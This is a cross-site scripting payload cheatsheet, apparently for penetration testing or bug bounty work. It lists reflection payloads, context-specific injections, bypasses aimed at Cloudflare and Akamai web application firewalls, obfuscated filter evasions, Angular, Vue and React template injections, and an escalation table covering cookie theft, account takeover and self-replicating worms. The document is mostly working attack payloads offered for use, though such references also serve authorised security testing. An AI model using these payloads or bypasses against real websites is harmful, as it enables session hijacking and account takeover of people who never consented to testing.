# XSS — Payload Cheatsheet

## Detection Payloads (try in order)

### Basic Reflection Test
```
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
<script>alert(1)</script>
javascript:alert(1)
```

### Context-Aware
```html
<!-- HTML attribute context -->
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='

<!-- JavaScript string context -->
';alert(1)//
";alert(1)//
\';alert(1)//

<!-- Template literal context -->
${alert(1)}
{{constructor.constructor('alert(1)')()}}

<!-- URL context -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>

<!-- CSS context (rare but exists) -->
expression(alert(1))
url('javascript:alert(1)')
```

### Event Handler Variants
```
onmouseover=alert(1)
onfocus=alert(1) autofocus
onload=alert(1)
onerror=alert(1)
onanimationend=alert(1)
ontransitionend=alert(1)
```

## WAF Bypass Patterns

### Cloudflare
```html
<svg/onload=alert(1)>
<img src=x onerror=alert`1`>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
```

### Akamai
```html
<img src=x onerror="a]|alert(1)//">
<svg/onload=prompt(1)>
<marquee onstart=alert(1)>
```

### Generic Filter Bypass
```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Null bytes -->
<scr%00ipt>alert(1)</scr%00ipt>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Tag mutation -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributename=x to=1>

<!-- Without parentheses -->
<img src=x onerror=alert`1`>
<img src=x onerror=window['alert'](1)>
<img src=x onerror=self['ale'+'rt'](1)>

<!-- Without alert/prompt/confirm -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=top[/al/.source+/ert/.source](1)>
```

## Framework-Specific

### React (dangerouslySetInnerHTML, href)
```
javascript:alert(1)  <!-- in href attributes -->
<!-- React strips event handlers from innerHTML -->
<!-- Focus on: href injection, window.postMessage, eval chains -->
```

### Angular
```
{{constructor.constructor('alert(1)')()}}
<div ng-app ng-csp><script>alert(1)</script></div>
```

### Vue.js
```
{{_c.constructor('alert(1)')()}}
<div v-html="'<img src=x onerror=alert(1)>'"></div>
```

### jQuery (before 3.5.0)
```
<!-- $.html() with user input -->
<img src=x onerror=alert(1)>
```

## Validation Criteria

A reflection is NOT XSS until:
1. Script executes in browser context (not just reflected)
2. Bypasses active CSP (if present)
3. Works through WAF/CDN layer (not just curl)
4. Fires in a realistic user scenario (not self-XSS without delivery)

## Impact Escalation

| Impact | What to demonstrate |
|--------|-------------------|
| Cookie theft | `document.cookie` contains session token + HttpOnly off |
| Account takeover | CSRF forge from XSS context (password change, email change) |
| Admin escalation | XSS fires in admin panel context |
| Stored cross-user | Payload persists and fires for other users |
| Wormable | XSS that replicates itself (e.g., profile XSS that edits other profiles) |
